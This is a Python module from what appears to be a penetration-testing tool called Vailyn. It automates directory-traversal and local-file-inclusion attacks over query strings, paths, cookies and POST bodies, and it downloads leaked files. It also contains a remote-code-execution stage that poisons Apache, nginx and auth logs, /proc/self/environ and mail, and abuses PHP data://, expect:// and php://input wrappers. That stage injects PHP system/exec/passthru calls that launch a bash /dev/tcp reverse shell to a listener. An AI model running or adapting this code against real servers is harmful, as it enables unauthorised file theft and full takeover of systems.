#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
_____, ___
   '+ .;
    , ;
     .

       .
     .;.
     .;
      :
      ,


┌─[Vailyn]─[~]
└──╼ VainlyStrain
"""


import multiprocessing
import requests
import sys
import subprocess
import base64
import psutil
import time

import core.variables as vars

from core.methods.session import session, random_ua
from core.colors import color
from core.variables import payloadlist, nullchars, LISTENIP, LISTENPORT, rce
from core.methods.filecheck import filecheck
from core.methods.loot import download
from core.methods.progress import progress, progresswin, progressgui
from core.methods.cookie import cookieFromFile
from core.methods.list import filegen
from urllib.parse import unquote

global maxlen
maxlen = len(max(payloadlist, key=len))

requestcount = 0

lock = multiprocessing.Lock()


def resetCounter():
    """
    reset the request counter
    """
    lock.acquire()
    try:
        global requestcount
        requestcount = 0
    finally:
        lock.release()


def encode64(payload):
    return base64.b64encode(payload.encode("utf-8")).decode("utf-8")


def inpath(traverse, dir, file, nb, url, url2, s):
    """
    prepare request for inpath attack
    """
    path = traverse + dir + file + nb + url2
    p = traverse + dir + file + nb
    req = requests.Request(method='GET', url=url)
    prep = s.prepare_request(req)
    prep.url = url + path
    return (prep, p)


def query(traverse, dir, file, nb, keyword, url, url2, s):
    """
    prepare request for query attack
    """
    if "?" not in url:
        query = "?" + keyword + "=" + traverse + dir + file + nb + url2
    else:
        query = "&" + keyword + "=" + traverse + dir + file + nb + url2
    p = traverse + dir + file + nb
    req = requests.Request(method='GET', url=url)
    prep = s.prepare_request(req)
    prep.url = url + query
    return (prep, p)


def fixURL(url, attack):
    """
    reformat potentially misformated URLs to the attack expectations.
    @params:
        url    - URL to format
        attack - attack ID being executed
    @return: the fixed URL
    """
    # resolve issues with inpath attack
    if attack == 2:
        # only root directory, else false positives
        splitted = url.split("://")
        ulist = splitted[1].split("/")
        last = ulist[-1]
        # delete file, but not hidden directory
        if "." in last and not last.startswith(".") and last != ulist[0]:
            del ulist[-1]
        url = splitted[0] + "://" + "/".join(ulist)
    if not url.endswith("/"):
        url += "/"

    return url


def initialPing(s, attack, url, url2, keyword, timeout):
    """
    performs the initial requests needed for the vulnerability analysis.
    @params:
        s       - session object with saved state
        attack  - attack mode
        url     - URL part 1
        url2    - URL part 2 (for attack = 1)
        keyword - GET Parameter for attack = 1
        timeout - request timeout
    @return: response contents for later analysis
    """
    # initial ping for filecheck
    if attack != 4:
        try:
            con2 = s.get(url, timeout=timeout).content
        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
            sys.exit("Timeout on initial check.")
    else:
        try:
            con2 = s.post(url, data={}, timeout=timeout).content
        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
            sys.exit("Timeout on initial check.")

    con3 = None
    if attack == 1:
        try:
            con3 = s.get(url + "?" + keyword + "=vailyn" + url2, timeout=timeout).content
        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
            sys.exit("Timeout on initial check.")

    return (con2, con3)


def attackRequest(s, attack, url, url2, keyword, selected, traverse, file, directory, nullbyte,
                  postdata, timeout, phase2=False, sheller=False):
    """
    This method executes the attack request and returns the result to the caller.
    @params:
        # see caller functions
        phase2  - adapt return value to Phase 2
        sheller - adapt return value to the RCE exploitation module
    @return: tuple of useful information, varies by caller
    """
    requestlist = []
    data = {}
    if attack == 1:
        prep, p = query(traverse, directory, file, nullbyte, keyword, url, url2, s)
        random_ua(s)
        r = s.send(prep, timeout=timeout)
    elif attack == 2:
        prep, p = inpath(traverse, directory, file, nullbyte, url, url2, s)
        random_ua(s)
        r = s.send(prep, timeout=timeout)
    elif attack == 3:
        s.cookies.set(selected, traverse + directory + file + nullbyte)
        p = traverse + directory + file + nullbyte
        random_ua(s)
        r = s.get(url, timeout=timeout)
    elif attack == 4:
        p = traverse + directory + file + nullbyte
        for prop in postdata.split("&"):
            pair = prop.split("=")
            if pair[1].strip() == "INJECT":
                pair[1] = p
            data[pair[0].strip()] = pair[1].strip()
        assert data != {}
        random_ua(s)
        req = requests.Request(method='POST', url=url, data=data)
        prep = s.prepare_request(req)
        newBody = unquote(prep.body)
        prep.body = newBody
        prep.headers["content-length"] = len(newBody)
        r = s.send(prep, timeout=timeout)

    try:
        if phase2:
            requestlist.append((r, p, data))
        elif sheller:
            requestlist.append((r, p, nullbyte, data, traverse))
        else:
            requestlist.append((r, p, nullbyte))
    except Exception:
        pass

    return requestlist


def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist, file, authcookie,
           postdata, gui):
    """
    [Phase 1]: Vulnerability Analysis
    @params:
        attack     - attack mode (-a ACK)
        url        - target part 1 (-v VIC)
        url2       - target part 2 (-q VIC2)
        keyword    - -p PAM (only for -a 1)
        cookie     - cookiejar for -a 3
        selected   - selected cookie to be poisoned
        verbose    - print 404s?
        depth      - attack depth (-d INT)
        paylist    - payload list (all)
        file       - file to be looked up (-i FIL, default: /etc/passwd)
        authcookie - Authentication Cookie File to bypass Login Screens
        postdata   - POST Data for --attack 4
        gui        - GUI frame to set the graphical progress bar
    """
    # variables for the progress counter
    global requestcount
    precise = vars.precise
    totalrequests = len(payloadlist) * (len(nullchars) + 1)
    if not precise:
        totalrequests = totalrequests * (depth)
    timeout = vars.timeout
    if gui:
        lock.acquire()
        try:
            gui.progressBar.reset()
            gui.progressBar.setMinimum(0)
            gui.progressBar.setMaximum(totalrequests)
        finally:
            lock.release()

    url = fixURL(url, attack)

    # initialize lists & session
    payloads = []
    nullbytes = []
    s = session()

    if authcookie != "":
        tmpjar = cookieFromFile(authcookie)
        for cookie in tmpjar:
            s.cookies.set_cookie(cookie)

    con2, con3 = initialPing(s, attack, url, url2, keyword, timeout)

    for i in paylist:
        if precise:
            layers = [depth]
        else:
            layers = list(range(1, depth + 1))

        for d in layers:
            traverse = ''
            j = 1
            # chain traversal payloads
            while j <= d:
                traverse += i
                j += 1

            # send attack requests - no nullbyte injection
            requestlist = []
            try:
                requestlist += attackRequest(
                    s, attack, url, url2, keyword, selected, traverse, file, "", "", postdata, timeout
                )
            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                print("Timeout reached for " + url)

            # repeat for nullbytes
            for nb in nullchars:
                try:
                    requestlist += attackRequest(
                        s, attack, url, url2, keyword, selected, traverse, file, "", nb, postdata,
                        timeout
                    )
                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                    print("Timeout reached for " + url)

            # analyze result
            found = False
            for (r, p, nb) in requestlist:
                lock.acquire()
                try:
                    requestcount += 1
                    if gui:
                        progressgui(requestcount, totalrequests, gui)
                    else:
                        if sys.platform.lower().startswith('win'):
                            if requestcount % 1000 == 0:
                                progresswin(requestcount, totalrequests, prefix=" ", suffix=" ")
                        else:
                            progress(requestcount, totalrequests, prefix=" ", suffix=" ")
                finally:
                    lock.release()
                if str(r.status_code).startswith("2"):
                    if filecheck(r, con2, con3, p) and attack != 4 or filecheck(r, con2, con3, p, post=True) and attack == 4:
                        payloads.append(i)
                        if nb != "":
                            nullbytes.append(nb)
                        found = True

                        out = color.RD + "[pl]" + color.END + color.O + " " + str(r.status_code) + color.END + " "
                        out = out + "{0:{1}}".format(i, maxlen) + " " + nb

                        print(out)
                if verbose and not found:
                    if attack == 1 or attack == 2:
                        print(color.END + "{}|: ".format(r.status_code)+r.url)
                    elif attack == 3 or attack == 4:
                        print(color.END + "{}|: ".format(r.status_code)+r.url + " : " + p)

            if found:
                break

    return (payloads, nullbytes)


def phase2(attack, url, url2, keyword, cookie, selected, filespath, dirs, depth, verbose, dl,
           selected_payloads, selected_nullbytes, authcookie, postdata, dirlen, gui):
    """
    [Phase 2]: Exploitation
    @params:
        attack             - attack mode (-a ACK)
        url                - target part 1 (-v VIC)
        url2               - target part 2 (-q VIC2)
        keyword            - -p PAM (only for -a 1)
        cookie             - cookiejar for -a 3
        selected           - selected cookie to be poisoned
        files              - file list created from -l FIL ...
        dirs               - directory list (permutation level based on -d INT)
        depth              - attack depth (-d INT)
        verbose            - print 404s?
        dl                 - download found files?
        selected_payloads  - payloads selected in phase 1
        selected_nullbytes - terminators selected in phase 1
        authcookie         - Authentication Cookie File to bypass Login Screens
        postdata           - POST Data for --attack 4
        dirlen             - total directory dictionary size (after permutations)
        gui                - GUI frame to set the graphical progress bar
    """
    # variables for the progress counter
    global requestcount
    timeout = vars.timeout
    fileslen = sum(1 for dummy in filegen(filespath))
    if len(selected_nullbytes) == 0:
        totalrequests = len(selected_payloads) * fileslen * dirlen * depth
    else:
        totalrequests = len(selected_payloads) * len(selected_nullbytes) * fileslen * dirlen * depth

    if gui:
        lock.acquire()
        try:
            gui.progressBar.reset()
            gui.progressBar.setMinimum(0)
            gui.progressBar.setMaximum(totalrequests)
        finally:
            lock.release()

    url = fixURL(url, attack)

    # initialize lists & session
    found = []
    urls = []
    s = session()

    if authcookie != "":
        tmpjar = cookieFromFile(authcookie)
        for cookie in tmpjar:
            s.cookies.set_cookie(cookie)

    con2, con3 = initialPing(s, attack, url, url2, keyword, timeout)

    try:
        for dir in dirs:
            files = filegen(filespath)
            for file in files:
                d = 1
                while d <= depth:
                    for i in selected_payloads:
                        traverse = ''
                        j = 1
                        # chain traversal payloads
                        while j <= d:
                            traverse += i
                            j += 1

                        # send attack requests - with or without nullbyte injection
                        requestlist = []
                        if selected_nullbytes == []:
                            try:
                                requestlist += attackRequest(
                                    s, attack, url, url2, keyword, selected, traverse, file, dir, "",
                                    postdata, timeout, phase2=True
                                )
                            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                                print("Timeout reached for " + url)
                                continue
                        else:
                            for nb in selected_nullbytes:
                                try:
                                    requestlist += attackRequest(
                                        s, attack, url, url2, keyword, selected, traverse, file, dir, nb,
                                        postdata, timeout, phase2=True
                                    )
                                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                                    print("Timeout reached for " + url)
                                    continue

                        # analyze result
                        for (r, p, data) in requestlist:
                            lock.acquire()
                            try:
                                requestcount += 1
                                if gui:
                                    progressgui(requestcount, totalrequests, gui)
                                else:
                                    if sys.platform.lower().startswith('win'):
                                        if requestcount % 1000 == 0:
                                            progresswin(requestcount, totalrequests, prefix=" ", suffix=" ")
                                    else:
                                        progress(requestcount, totalrequests, prefix=" ", suffix=" ")
                            finally:
                                lock.release()

                            vfound = False
                            if str(r.status_code).startswith("2"):
                                if (filecheck(r, con2, con3, p) and attack != 4
                                        or filecheck(r, con2, con3, p, post=True) and attack == 4):
                                    vfound = True
                                    if attack == 1 or attack == 2:
                                        print(color.RD+"[INFO]" + color.O + " leak" + color.END + "       "
                                              + color.RD + "statvs-code" + color.END + "=" + color.O + str(r.status_code)
                                              + color.END + " " + color.R + "site" + color.END + "=" + r.url)

                                        if dl and dir + file not in found:
                                            download(r.url, dir+file, cookie=s.cookies)
                                        found.append(dir + file)
                                        if attack == 1:
                                            urls.append(color.RD + "[pl]" + color.END + color.O + " "
                                                        + str(r.status_code) + color.END + " "
                                                        + r.url.split(keyword+"=")[1].replace(url2, ""))
                                        else:
                                            vlnlist = r.url.split("/")[1::]
                                            vlnpath = ("/".join(i for i in vlnlist)).replace(url2, "")
                                            urls.append(color.RD + "[pl]" + color.END + color.O + " "
                                                        + str(r.status_code) + color.END + " " + vlnpath)
                                    elif attack == 3:
                                        s.cookies.set(selected, p)
                                        print(color.RD + "[INFO]" + color.O + " leak" + color.END +
                                              "       " + color.RD + "statvs-code" + color.END + "=" + color.O
                                              + str(r.status_code) + color.END + " " + color.R + "cookie" +
                                              color.END + "=" + p)

                                        if dl and dir + file not in found:
                                            download(r.url, dir+file, cookie=s.cookies)
                                        found.append(dir + file)
                                        urls.append(color.RD + "[pl]" + color.END + color.O + " " +
                                                    str(r.status_code) + color.END + " " + p)
                                    elif attack == 4:
                                        print(color.RD + "[INFO]" + color.O + " leak" + color.END +
                                              "       " + color.RD + "statvs-code" + color.END + "=" + color.O
                                              + str(r.status_code) + color.END + " " + color.R + "postdata"
                                              + color.END + "=" + p)

                                        if dl and dir + file not in found:
                                            download(r.url, dir + file, cookie=s.cookies, post=data)
                                        found.append(dir + file)
                                        urls.append(color.RD + "[pl]" + color.END + color.O + " "
                                                    + str(r.status_code) + color.END + " " + p)

                            if verbose and not vfound:
                                if attack == 1 or attack == 2:
                                    print(color.END + "{}|: ".format(r.status_code)+r.url)
                                elif attack == 3 or attack == 4:
                                    print(color.END + "{}|: ".format(r.status_code)+r.url + " : " + p)
                    d += 1
        return (found, urls)
    except KeyboardInterrupt:
        return (found, urls)


def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, paylist, nullist,
            authcookie, postdata, depth, gui, app):
    """
    second exploitation module: try to gain a reverse shell over the system
    @params:
        technique - technique index (see variables.rce)
    """
    # TODO clean me up
    url = fixURL(url, attack)

    s = session()
    timeout = vars.timeout

    success = None

    print(color.RD+"[INFO]" + color.O + " RCE" + color.END + color.RD + "|" + color.END + "  "
          + color.RC + "Using Technique:" + color.END + color.O + "" + str(rce[technique]) + color.END)
    if gui:
        gui.crawlerResultDisplay.append("[Info] RCE|  Using Technique: {}".format(str(rce[technique])))
        gui.show()
        app.processEvents()

    if technique == 1:
        file = "/proc/self/environ"
    elif technique == 2:
        file = "/var/log/apache2/access.log"
    elif technique == 3:
        file = "/var/log/auth.log"
    elif technique == 4:
        file = "/var/mail/www-data"
    elif technique == 5:
        file = "/var/log/nginx/access.log"
    elif technique == 6:
        success = ["something here"]

    if authcookie != "":
        tmpjar = cookieFromFile(authcookie)
        for cookie in tmpjar:
            s.cookies.set_cookie(cookie)

    con2, con3 = initialPing(s, attack, url, url2, keyword, timeout)

    if technique != 6:
        sys.stdout.write("{0} └── Looking for Log File:{1}".format(color.RD, color.END))
        for i in paylist:
            d = 1
            while d <= depth:
                traverse = ''
                j = 1
                # chain traversal payloads
                while j <= d:
                    traverse += i
                    j += 1

                # send attack requests - no nullbyte injection
                requestlist = []
                if nullist == []:
                    try:
                        requestlist += attackRequest(
                            s, attack, url, url2, keyword, selected, traverse, file, "", "",
                            postdata, timeout, sheller=True
                        )
                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                        print("Timeout reached for " + url)
                else:
                    for nb in nullist:
                        try:
                            requestlist += attackRequest(
                                s, attack, url, url2, keyword, selected, traverse, file, "", nb,
                                postdata, timeout, sheller=True
                            )
                        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                            print("Timeout reached for " + url)
                            continue

                # analyze result
                found = False
                for (r, p, nb, data, traverse) in requestlist:
                    if attack == 3:
                        s.cookies.set(selected, p)
                    if str(r.status_code).startswith("2"):
                        if filecheck(r, con2, con3, p) and attack != 4 or filecheck(r, con2, con3, p, post=True) and attack == 4:
                            success = (r, p, nb, data, traverse)
                            found = True
                            break
                    if verbose:
                        if attack == 1 or attack == 2:
                            print(color.END + "{}|: ".format(r.status_code)+r.url)
                        elif attack == 3 or attack == 4:
                            print(color.END + "{}|: ".format(r.status_code)+r.url + " : " + p)
                d += 1
                if found:
                    sys.stdout.write("{0} OK  {2}|{1}\n".format(color.O, color.END, color.END + color.RD))
                    break

    if success:
        PAYLOAD = "bash -i >& /dev/tcp/{}/{} 0>&1".format(vars.LISTENIP, vars.LISTENPORT)
        if technique != 6:
            if attack == 1:
                prep = query(success[4], "", file, success[2], keyword, url, url2, s)[0]
            elif attack == 2:
                prep = inpath(success[4], "", file, success[2], url, url2, s)[0]
            elif attack == 3:
                s.cookies.set(selected, success[1])
                req = requests.Request(method='GET', url=url)
                prep = s.prepare_request(req)
            elif attack == 4:
                req = requests.Request(method='POST', url=url, data=success[3])
                prep = s.prepare_request(req)
                newBody = unquote(prep.body)
                prep.body = newBody
                prep.headers["content-length"] = len(newBody)

        if technique == 1:
            prep.headers['User-agent'] = '<?php system("{}"); ?>'.format(PAYLOAD)
            sys.stdout.write("{0}  : Trying system():{1}      ".format(color.RD, color.END))
            if gui:
                gui.crawlerResultDisplay.append("  : Trying {}".format("system():      "))
                gui.show()
                app.processEvents()
            try:
                s.send(prep, timeout=timeout)
                showStatus(gui)
                if app:
                    app.processEvents()
            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                showStatus(gui, timeout=True)
                if app:
                    app.processEvents()
            prep.headers['User-agent'] = '<?php exec("{}"); ?>'.format(PAYLOAD)
            sys.stdout.write("{0}  : Trying exec():{1}        ".format(color.RD, color.END))
            if gui:
                gui.crawlerResultDisplay.append("  : Trying {}".format("exec():        "))
                gui.show()
                app.processEvents()
            try:
                s.send(prep, timeout=timeout)
                showStatus(gui)
                if app:
                    app.processEvents()
            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                showStatus(gui, timeout=True)
                if app:
                    app.processEvents()
            prep.headers['User-agent'] = '<?php passthru("{}"); ?>'.format(PAYLOAD)
            sys.stdout.write("{0}  : Trying passthru():{1}    ".format(color.RD, color.END))
            if gui:
                gui.crawlerResultDisplay.append("  : Trying {}".format("passthru():    "))
                gui.show()
                app.processEvents()
            try:
                s.send(prep, timeout=timeout)
                showStatus(gui)
                if app:
                    app.processEvents()
            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                showStatus(gui, timeout=True)
                if app:
                    app.processEvents()
        elif technique == 2 or technique == 5:
            req = requests.Request(method='GET', url=url)
            prep2 = s.prepare_request(req)
            prep2.url = url + "/" + '<?php system("{}"); ?>'.format(PAYLOAD)
            sys.stdout.write("{0}  : Trying system():{1}      ".format(color.RD, color.END))
            if gui:
                gui.crawlerResultDisplay.append("  : Trying {}".format("system():      "))
                gui.show()
                app.processEvents()
            try:
                s.send(prep2, timeout=timeout)
                s.send(prep, timeout=timeout)
                showStatus(gui)
                if app:
                    app.processEvents()
            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                showStatus(gui, timeout=True)
                if app:
                    app.processEvents()
            prep2.url = url + "/" + '<?php exec("{}"); ?>'.format(PAYLOAD)
            sys.stdout.write("{0}  : Trying exec():{1}        ".format(color.RD, color.END))
            if gui:
                gui.crawlerResultDisplay.append("  : Trying {}".format("exec():        "))
                gui.show()
                app.processEvents()
            try:
                s.send(prep2, timeout=timeout)
                s.send(prep, timeout=timeout)
                showStatus(gui)
                if app:
                    app.processEvents()
            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                showStatus(gui, timeout=True)
                if app:
                    app.processEvents()
            prep2.url = url + "/" + '<?php passthru("{}"); ?>'.format(PAYLOAD)
            sys.stdout.write("{0}  : Trying passthru():    {1}".format(color.RD, color.END))
            if gui:
                gui.crawlerResultDisplay.append("  : Trying {}".format("passthru():    "))
                gui.show()
                app.processEvents()
            try:
                s.send(prep2, timeout=timeout)
                s.send(prep, timeout=timeout)
                showStatus(gui)
                if app:
                    app.processEvents()
            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                showStatus(gui, timeout=True)
                if app:
                    app.processEvents()
        elif technique == 3:
            tmp = url.split("://")[1]
            if "@" in tmp:
                tmp = tmp.split("@")[1]
            host = tmp.split("/")[0].split(":")[0]
            sshs = ['<?php system("{}"); ?>@{}'.format(PAYLOAD, host),
                    '<?php exec("{}"); ?>@{}'.format(PAYLOAD, host),
                    '<?php passthru("{}"); ?>@{}'.format(PAYLOAD, host)]
            ssht = ["system():      ", "exec():        ", "passthru():    "]
            for i in range(0, len(sshs)):
                sys.stdout.write("{0}  : Trying {2}{1}".format(color.RD, color.END, ssht[i]))
                if gui:
                    gui.crawlerResultDisplay.append("  : Trying {}".format(ssht[i]))
                    gui.show()
                    app.processEvents()
                try:
                    if sys.platform.lower().startswith("win"):
                        subprocess.run(["putty.exe", "-ssh", sshs[i]])
                    else:
                        subprocess.run(["ssh", sshs[i]])
                except Exception as e:
                    showStatus(gui, exception=e)
                    if app:
                        app.processEvents()
                try:
                    s.send(prep, timeout=timeout)
                    showStatus(gui)
                    if app:
                        app.processEvents()
                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                    showStatus(gui, timeout=True)
                    if app:
                        app.processEvents()
        elif technique == 4:
            tmp = url.split("://")[1]
            if "@" in tmp:
                tmp = tmp.split("@")[1]
            topics = ['I<3shells <?php system("{}"); ?>'.format(PAYLOAD),
                      'I<3shells <?php exec("{}"); ?>'.format(PAYLOAD),
                      'I<3shells <?php passthru("{}"); ?>'.format(PAYLOAD)]
            topict = ["system():      ", "exec():        ", "passthru():    "]
            host = tmp.split("/")[0].split(":")[0]
            for i in range(0, len(topics)):
                sys.stdout.write("{0}  : Trying {2}{1}".format(color.RD, color.END, topict[i]))
                if gui:
                    gui.crawlerResultDisplay.append("  : Trying {}".format(topict[i]))
                    gui.show()
                    app.processEvents()
                try:
                    p = subprocess.Popen(["echo", "Uno reverse shell"], stdout=subprocess.PIPE)
                    subprocess.call(["mail", "-s", topics[i], "www-data@{}".format(host)], stdin=p.stdout)
                except Exception as e:
                    showStatus(gui, exception=e)
                    if app:
                        app.processEvents()
                try:
                    s.send(prep, timeout=timeout)
                    showStatus(gui)
                    if app:
                        app.processEvents()
                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                    showStatus(gui, timeout=True)
                    if app:
                        app.processEvents()
        elif technique == 6:
            wrappersPart1 = [
                'expect://{}'.format(PAYLOAD),
                'data://text/plain,<?php system("{}"); ?>'.format(PAYLOAD),
                'data://text/plain,<?php exec("{}"); ?>'.format(PAYLOAD),
                'data://text/plain,<?php passthru("{}"); ?>'.format(PAYLOAD),
                'data://text/plain;base64,' + encode64('<?php system("{}"); ?>'.format(PAYLOAD)),
                'data://text/plain;base64,' + encode64('<?php exec("{}"); ?>'.format(PAYLOAD)),
                'data://text/plain;base64,' + encode64('<?php passthru("{}"); ?>'.format(PAYLOAD))
            ]

            namesPart1 = [
                "expect:               ",
                "data.system():        ",
                "data.exec():          ",
                "data.passthru():      ",
                "data.b64.system():    ",
                "data.b64.exec():      ",
                "data.b64.passthru():  "
            ]

            for i in range(0, len(wrappersPart1)):
                wrapper = wrappersPart1[i]
                sys.stdout.write("{0}  : {2}{1}".format(color.RD, color.END, namesPart1[i]))
                if gui:
                    gui.crawlerResultDisplay.append("  : {}".format(namesPart1[i]))
                    gui.show()
                    app.processEvents()
                if attack == 1:
                    prep = query("", "", wrapper, "", keyword, url, url2, s)[0]
                elif attack == 2:
                    prep = inpath("", "", wrapper, "", url, url2, s)[0]
                elif attack == 3:
                    s.cookies.set(selected, wrapper)
                    req = requests.Request(method='GET', url=url)
                    prep = s.prepare_request(req)
                elif attack == 4:
                    req = requests.Request(method='POST', url=url, data=wrapper)
                    prep = s.prepare_request(req)
                    newBody = unquote(prep.body)
                    prep.body = newBody
                    prep.headers["content-length"] = len(newBody)
                try:
                    s.send(prep, timeout=timeout)
                    showStatus(gui)
                    if app:
                        app.processEvents()
                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                    showStatus(gui, timeout=True)
                    if app:
                        app.processEvents()

            wrapper = "php://input"
            payloads = [
                '<?php system("{}"); ?>'.format(PAYLOAD),
                '<?php exec("{}"); ?>'.format(PAYLOAD),
                '<?php passthru("{}"); ?>'.format(PAYLOAD)
            ]
            names = ["php input.system():   ", "php input.exec():     ", "php input.passthru(): "]
            for i in range(0, len(payloads)):
                sys.stdout.write("{0}  : {2}{1}".format(color.RD, color.END, names[i]))
                if gui:
                    gui.crawlerResultDisplay.append("  : Trying {}".format(names[i]))
                    gui.show()
                    app.processEvents()
                if attack == 1:
                    if "?" not in url:
                        cont = "?" + keyword + "=" + wrapper + url2
                    else:
                        cont = "&" + keyword + "=" + wrapper + url2
                    req = requests.Request(method='POST', url=url + cont, data=payloads[i])
                    prep = s.prepare_request(req)
                elif attack == 3:
                    s.cookies.set(selected, wrapper)
                    req = requests.Request(method='POST', url=url + cont, data=payloads[i])
                    prep = s.prepare_request(req)
                else:
                    prep = None
                
                if prep:
                    try:
                        s.send(prep, timeout=timeout)
                        showStatus(gui)
                        if app:
                            app.processEvents()
                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                        showStatus(gui, timeout=True)
                        if app:
                            app.processEvents()
                else:
                    showStatus(gui, exception="Attack vector not supported.")
                    if app:
                        app.processEvents()
    else:
        sys.stdout.write("{0} FAIL{2}|{1}\n".format(color.O, color.END, color.END + color.RD))
        if gui:
            gui.crawlerResultDisplay.append(" FAIL\n")
            gui.show()
            app.processEvents()


def lfishell(techniques, attack, url, url2, keyword, cookie, selected, verbose, paylist, nullist,
             authcookie, postdata, depth, gui=None, app=None):
    """
    invoke sheller() for each technique
    @params:
        techniques - list of attack techniques to use
        gui        - GUI Window to print output to
        (see other methods)
    """
    print()
    if gui and app:
        gui.crawlerResultDisplay.setText("")
        gui.show()
        app.processEvents()
    for technique in techniques:
        sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, paylist, nullist,
                authcookie, postdata, depth, gui, app)


def showStatus(gui, timeout=False, exception=None):
    """
    print status of RCE probe
    """
    if exception:
        sys.stdout.write("{0} FAIL{2}|{1}\n".format(color.O, color.END, color.END + color.RD))
        print("{0}Exception:{1}\n{2}".format(color.O, color.END, exception))
        if gui:
            gui.crawlerResultDisplay.append(" FAIL\nException:\n{}\n".format(exception))
            gui.show()
        return
    if timeout:
        sys.stdout.write("{0} FAIL{2}|{1}\n".format(color.O, color.END, color.END + color.RD))
        print("{0}Timeout{1}".format(color.O, color.END))
        if gui:
            gui.crawlerResultDisplay.append(" FAIL\nTimeout\n")
            gui.show()
        return
    if checkConn():
        sys.stdout.write("{0} PWN {2}|{1}\n".format(color.O, color.END, color.END + color.RD))
        if gui:
            gui.crawlerResultDisplay.append(" PWN\n")
            gui.show()
    else:
        sys.stdout.write("{0} FAIL{2}|{1}\n".format(color.O, color.END, color.END + color.RD))
        if gui:
            gui.crawlerResultDisplay.append(" FAIL\n")
            gui.show()


def checkConn():
    """
    check if our reverse shell has arrived
    """
    # give the server some time
    time.sleep(2)
    try:
        # list all connections
        connections = psutil.net_connections()
        for connection in connections:
            # we are interested in our netcat socket
            if connection.laddr[1] == vars.LISTENPORT:
                if connection.status == psutil.CONN_ESTABLISHED:
                    # shell has arrived, all good
                    return True
    except Exception:
        pass
    return False